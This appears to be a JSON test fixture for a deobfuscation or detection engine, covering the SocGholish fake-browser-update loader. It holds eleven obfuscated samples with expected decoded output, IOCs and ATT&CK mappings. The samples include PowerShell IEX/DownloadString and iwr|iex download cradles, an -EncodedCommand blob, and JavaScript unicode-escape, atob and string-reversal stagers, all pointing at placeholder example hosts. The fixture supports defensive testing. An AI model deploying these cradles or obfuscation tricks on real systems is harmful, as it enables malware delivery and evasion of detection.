@@ -1,0 +1,587 @@
+{
+  "family_id": "socgholish",
+  "family_display_name": "SocGholish",
+  "family_version": "r1-2.0.0",
+  "schema_version": "technique-first-1.0.0",
+  "description": "SocGholish (FakeUpdates / TA569) JavaScript-heavy fake-browser-update loader. This pack amortizes the JS decoder pass across a second JS family and covers the PowerShell handoff stage.",
+  "primary_mitre_attack": [
+    "T1059.001",
+    "T1059.007",
+    "T1027",
+    "T1027.010",
+    "T1140",
+    "T1105",
+    "T1189"
+  ],
+  "primary_behaviors": [
+    "fake_browser_update_delivery",
+    "javascript_to_powershell_handoff",
+    "download_and_execute",
+    "obfuscated_command_line",
+    "c2_beacon"
+  ],
+  "known_technique_universe": [
+    "javascript_atob_next_stage",
+    "javascript_eval_chain",
+    "javascript_split_join_delimiter_replace",
+    "javascript_split_shuffle_url_reveal",
+    "javascript_unicode_escape_stager",
+    "powershell_backtick_alias_obf",
+    "powershell_encodedcommand_from_js",
+    "powershell_iex_download_cradle",
+    "powershell_string_concat_url",
+    "wscript_shell_exec"
+  ],
+  "coverage_gap_techniques": [
+    "javascript_eval_chain",
+    "wscript_shell_exec"
+  ],
+  "techniques": [
+    {
+      "id": "javascript_unicode_escape_stager",
+      "display_name": "JavaScript Unicode-Escape Stager",
+      "description": "SocGholish signature: fake browser-update .js delivers a next-stage command as a `'\\u00XX...' ` string. Observed in every public SocGholish sample since 2021.",
+      "mitre_attack": [
+        "T1027",
+        "T1140",
+        "T1059.007",
+        "T1189"
+      ],
+      "samples": [
+        {
+          "id": "SG001",
+          "variant": "unicode_escape_url_reveal",
+          "input": "var u = '\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0073\\u006f\\u0063\\u0067\\u0068\\u002d\\u0063\\u0064\\u006e\\u002e\\u0065\\u0078\\u0061\\u006d\\u0070\\u006c\\u0065\\u002e\\u0063\\u006f\\u006d\\u002f\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002e\\u006a\\u0073';",
+          "expected": {
+            "interpreter": "javascript",
+            "final_interpreter": "javascript",
+            "decoder_chain": [
+              "js-unicode-escape"
+            ],
+            "final_output_contains": [
+              "http://socgh-cdn.example.com/update.js"
+            ],
+            "iocs_contains": [
+              "http://socgh-cdn.example.com/update.js"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.007"
+            ],
+            "behaviors": [
+              "fake_browser_update_delivery",
+              "javascript_to_powershell_handoff"
+            ],
+            "capabilities": [
+              "js_unicode_escape_obf",
+              "seo_poisoning_delivery"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "d62c567b144ef49b966c671275330fec293fe39ad0fe18e22c385b61b8bb3317",
+              "certificate_fingerprint": "23deb4c82af51fa888fd15da3e8d9ef1b2b8e64ebbbbbb8722b66213d89784cd",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        },
+        {
+          "id": "SG002",
+          "variant": "unicode_escape_ps_cradle_reveal",
+          "input": "var cmd = '\\u0049\\u0045\\u0058\\u0020\\u0028\\u0028\\u004e\\u0065\\u0077\\u002d\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u004e\\u0065\\u0074\\u002e\\u0057\\u0065\\u0062\\u0043\\u006c\\u0069\\u0065\\u006e\\u0074\\u0029\\u002e\\u0044\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0022\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0073\\u006f\\u0063\\u0067\\u0068\\u002d\\u0063\\u0032\\u002e\\u0065\\u0078\\u0061\\u006d\\u0070\\u006c\\u0065\\u002e\\u0063\\u006f\\u006d\\u002f\\u0073\\u0074\\u0061\\u0067\\u0065\\u0032\\u002e\\u0070\\u0073\\u0031\\u0022\\u0029\\u0029';",
+          "expected": {
+            "interpreter": "javascript",
+            "final_interpreter": "javascript",
+            "decoder_chain": [
+              "js-unicode-escape"
+            ],
+            "final_output_contains": [
+              "IEX",
+              "DownloadString",
+              "socgh-c2.example.com/stage2.ps1"
+            ],
+            "iocs_contains": [
+              "http://socgh-c2.example.com/stage2.ps1"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.007",
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "javascript_to_powershell_handoff",
+              "download_and_execute"
+            ],
+            "capabilities": [
+              "js_unicode_escape_obf",
+              "javascript_to_powershell_handoff"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "a4b5dd7f0d6d579e2430fce1c2bfb460565cb3d673927c8f936db4d888dfd0b2",
+              "certificate_fingerprint": "484f1108265bc8b9d12d6ad2a1770fa3cee49595bf3c0991a5c96a082ae07a83",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "javascript_atob_next_stage",
+      "display_name": "JavaScript atob() Next-Stage Reveal",
+      "description": "atob() and nested atob(atob(...)) reveal the next-stage URL or PowerShell command. Observed in Mandiant SocGholish reports.",
+      "mitre_attack": [
+        "T1027",
+        "T1140",
+        "T1059.007"
+      ],
+      "samples": [
+        {
+          "id": "SG003",
+          "variant": "single_atob_url_reveal",
+          "input": "var u = atob('aHR0cHM6Ly9zb2NnaC1jZG4yLmV4YW1wbGUubmV0L2Jyb3dzZXJfdXBkLmpz');",
+          "expected": {
+            "interpreter": "javascript",
+            "final_interpreter": "javascript",
+            "decoder_chain": [
+              "js-atob"
+            ],
+            "final_output_contains": [
+              "https://socgh-cdn2.example.net/browser_upd.js"
+            ],
+            "iocs_contains": [
+              "https://socgh-cdn2.example.net/browser_upd.js"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.007"
+            ],
+            "behaviors": [
+              "fake_browser_update_delivery",
+              "javascript_to_powershell_handoff"
+            ],
+            "capabilities": [
+              "js_atob_obf",
+              "seo_poisoning_delivery"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "38c2aced502f94721f1b50ec22ea6d74afd6b21c2d697c901820df0b57820c92",
+              "certificate_fingerprint": "6a58f57539448dea1795583fee70405021268a75e386e94c1c501f4cec8f8b6b",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        },
+        {
+          "id": "SG004",
+          "variant": "nested_atob_ps_cradle_reveal",
+          "input": "var c = atob(atob('U1VWWUlDZ29UbVYzTFU5aWFtVmpkQ0JPWlhRdVYyVmlRMnhwWlc1MEtTNUViM2R1Ykc5aFpGTjBjbWx1WnlnaWFIUjBjRG92TDNOdlkyZG9MV015TG1WNFlXMXdiR1V1WTI5dEwzTjBZV2RsTWk1d2N6RWlLU2s9'));",
+          "expected": {
+            "interpreter": "javascript",
+            "final_interpreter": "javascript",
+            "decoder_chain": [
+              "js-atob"
+            ],
+            "final_output_contains": [
+              "IEX",
+              "DownloadString",
+              "socgh-c2.example.com/stage2.ps1"
+            ],
+            "iocs_contains": [
+              "http://socgh-c2.example.com/stage2.ps1"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.007",
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "javascript_to_powershell_handoff",
+              "download_and_execute"
+            ],
+            "capabilities": [
+              "js_atob_obf",
+              "javascript_to_powershell_handoff"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "5bb1e27a029fb490ba5c298a315245ebb59b63fc618c7c116ca6d737724323df",
+              "certificate_fingerprint": "44508335543a3b59984aa6acd9e6bb256b68e3c98f4a4d5ccf1bab5b295a4c8d",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "javascript_split_shuffle_url_reveal",
+      "display_name": "JavaScript .split().reverse().join() Shuffle",
+      "description": "The stager URL is stored reversed and reassembled at runtime with `.split('').reverse().join('')`.",
+      "mitre_attack": [
+        "T1027",
+        "T1140",
+        "T1059.007"
+      ],
+      "samples": [
+        {
+          "id": "SG005",
+          "variant": "split_reverse_join_url_reveal",
+          "input": "var u = 'sj.etadpu_emorhc/gro.elpmaxe.ekaf-hgcos//:ptth'.split('').reverse().join('');",
+          "expected": {
+            "interpreter": "javascript",
+            "final_interpreter": "javascript",
+            "decoder_chain": [
+              "js-split-reverse-join"
+            ],
+            "final_output_contains": [
+              "http://socgh-fake.example.org/chrome_update.js"
+            ],
+            "iocs_contains": [
+              "http://socgh-fake.example.org/chrome_update.js"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.007"
+            ],
+            "behaviors": [
+              "fake_browser_update_delivery",
+              "javascript_to_powershell_handoff"
+            ],
+            "capabilities": [
+              "js_split_shuffle_obf",
+              "seo_poisoning_delivery"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "b0ccf5f686488c545b246168c96ab36d49da65f349675e63b0d6cee741a6ce01",
+              "certificate_fingerprint": "d48654fa2c3f14f0117c1e7c81272127db8cfa3a84379931f8470422a5fefe54",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "javascript_split_join_delimiter_replace",
+      "display_name": "JavaScript .split().join() Delimiter Replace",
+      "description": "URL slashes replaced with a sentinel character; the .js reassembles them at runtime with `.split('X').join('/')`.",
+      "mitre_attack": [
+        "T1027",
+        "T1140",
+        "T1059.007"
+      ],
+      "samples": [
+        {
+          "id": "SG006",
+          "variant": "split_join_url_delimiter_reveal",
+          "input": "var u = 'http:QQsocgh-sj.example.com/updateQQscript.js'.split('QQ').join('//');",
+          "expected": {
+            "interpreter": "javascript",
+            "final_interpreter": "javascript",
+            "decoder_chain": [
+              "js-split-join"
+            ],
+            "final_output_contains": [
+              "http://socgh-sj.example.com/update//script.js"
+            ],
+            "iocs_contains": [
+              "http://socgh-sj.example.com/update//script.js"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.007"
+            ],
+            "behaviors": [
+              "fake_browser_update_delivery"
+            ],
+            "capabilities": [
+              "js_split_shuffle_obf",
+              "seo_poisoning_delivery"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "c04bda904294e2fdaea0d50e0cfa144e2c818b77a56112d814c86aaa5c28c6db",
+              "certificate_fingerprint": "74aeda1586807c57f8c79cfe334e7468472f10e0c6c1263ba11b2db6aff2245e",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_encodedcommand_from_js",
+      "display_name": "PowerShell -EncodedCommand Handoff from JS Stage",
+      "description": "After the .js decodes, it invokes powershell.exe with a -EncodedCommand blob containing the actual stealer/beacon.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027",
+        "T1140",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "SG007",
+          "variant": "encodedcommand_iex_cradle_from_js",
+          "input": "powershell -EncodedCommand SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBzAG8AYwBnAGgALQBjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBzAHQAYQBnAGUAMgAuAHAAcwAxACIAKQApAA==",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://socgh-c2.example.com/stage2.ps1"
+            ],
+            "iocs_contains": [
+              "http://socgh-c2.example.com/stage2.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1027",
+              "T1140",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "encoded_command",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "ccfb4dab2849406283f326a1c3b72765dad5ad7edb3690a185ec7bee949e55c9",
+              "certificate_fingerprint": "19af1c0e5b5503d56c016df935fd935b2d8863bcba19a74a5f1ce8d0b916c1f2",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_string_concat_url",
+      "display_name": "PowerShell URL String-Concat (SocGholish stage-2)",
+      "description": "Stage-2 PowerShell reassembles the C2 URL from SQ concat fragments to evade static URL extraction.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "SG008",
+          "variant": "three_var_url_c2",
+          "input": "$a='ht'; $b='tp://socgh-c2-split.example.com'; $c='/beacon'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "variable-propagate",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://socgh-c2-split.example.com/beacon"
+            ],
+            "iocs_contains": [
+              "http://socgh-c2-split.example.com/beacon"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "capabilities": [
+              "string_concat_obfuscation",
+              "variable_propagation_obfuscation",
+              "download_cradle"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "73c6aabe4613db5ed182773889015cce45be70487ad2f656da4b6266e8e3dd57",
+              "certificate_fingerprint": "9e041beec2ae968772889e6ba123e02c583b96f3a5cc7a72ff5327e9bce85280",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_iex_download_cradle",
+      "display_name": "PowerShell IEX DownloadString Beacon",
+      "description": "Downstream C2 check-in beacon delivered by SocGholish PowerShell stage.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1105"
+      ],
+      "samples": [
+        {
+          "id": "SG009",
+          "variant": "iex_downloadstring_beacon",
+          "input": "IEX ((New-Object Net.WebClient).DownloadString('http://socgh-beacon.example.com/task'))",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://socgh-beacon.example.com/task"
+            ],
+            "iocs_contains": [
+              "http://socgh-beacon.example.com/task"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "c2_beacon"
+            ],
+            "capabilities": [
+              "download_cradle",
+              "beacon_c2"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "e2c6a8f1a29eefd624f56212159bdafdea3616be63f1329ddd71f4424aa5998a",
+              "certificate_fingerprint": "fe8e6f1475c93cc9e91b563d425a7a4317792707c5c2cd762b22b4adbde38d4a",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        },
+        {
+          "id": "SG010",
+          "variant": "iwr_useb_iex_beacon",
+          "input": "iwr https://socgh-beacon2.example.net/task -useb | iex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "https://socgh-beacon2.example.net/task",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "https://socgh-beacon2.example.net/task"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105"
+            ],
+            "behaviors": [
+              "download_and_execute",
+              "c2_beacon"
+            ],
+            "capabilities": [
+              "iwr_pipeline_download",
+              "beacon_c2"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "fdc10691557b0d766c8863e880f7725c981c7bc2564a106f9197582e253480e5",
+              "certificate_fingerprint": "d38074f6839566848982cbc4345e886147041d5f3c0aa69dd5951f4d064eb403",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "powershell_backtick_alias_obf",
+      "display_name": "PowerShell Backtick Alias Obfuscation",
+      "description": "Backticks injected mid-identifier for signature evasion.",
+      "mitre_attack": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "samples": [
+        {
+          "id": "SG011",
+          "variant": "backtick_iwr_useb_iex",
+          "input": "i`wr 'http://socgh-bt.example.com/backtick_stager.ps1' -useb | i`ex",
+          "expected": {
+            "interpreter": "powershell",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "backtick-strip",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-WebRequest",
+              "http://socgh-bt.example.com/backtick_stager.ps1",
+              "Invoke-Expression"
+            ],
+            "iocs_contains": [
+              "http://socgh-bt.example.com/backtick_stager.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1105",
+              "T1027.010"
+            ],
+            "behaviors": [
+              "backtick_obfuscation",
+              "download_and_execute"
+            ],
+            "capabilities": [
+              "backtick_obfuscation",
+              "iwr_pipeline_download"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "98c3cf62ad232273d30b2640ede69d8d000dfc339c5ff3a550de23e63a6d5bee",
+              "certificate_fingerprint": "80826f5832ee2027ea30abb2c0852a190888a66b86bb987a6f15d4a52d2415ff",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:46:37+00:00"
+            }
+          }
+        }
+      ]
+    }
+  ],
+  "fingerprint_schema_version": "r1-2.0.0"
+}
